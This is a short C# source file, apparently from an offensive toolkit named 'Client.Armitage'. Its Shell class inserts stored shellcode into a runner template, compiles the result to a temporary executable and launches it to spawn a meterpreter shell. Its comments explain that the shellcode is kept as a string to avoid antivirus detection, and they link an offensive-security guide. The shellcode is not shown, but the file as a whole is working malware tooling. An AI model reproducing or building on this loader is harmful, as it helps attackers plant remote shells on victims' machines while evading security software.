using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage
{
    /// <summary>
    /// A class that spawns a meterpreter shell on a separate process.
    /// </summary>
    public static class Shell
    {

        /// It's necessary to put the ShellCode in string to prevent AV detection.
        /// To generate one, see: https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c
        /// Currently disabled because AntiVirus detects
        public static void Start()
        {
            string temppath = Utilities.FilesAndDirectories.GetTempExePath();
            // code to be compiled
            string code = Properties.Resources.ShellCode_Runner.Replace(
                "[SHELLCODE]", Properties.Resources.ShellCode);
       
            Debug.WriteLine(code);

            Compiler compiler = new Compiler(
                new string[] {
                    "mscorlib.dll", 
                    "System.Core.dll",
                    "System.dll"
                }, temppath);
            compiler.CompileCode(code);

            Debug.WriteLine("New shell at: " + temppath);

            Process.Start(temppath);
        }
    }
}
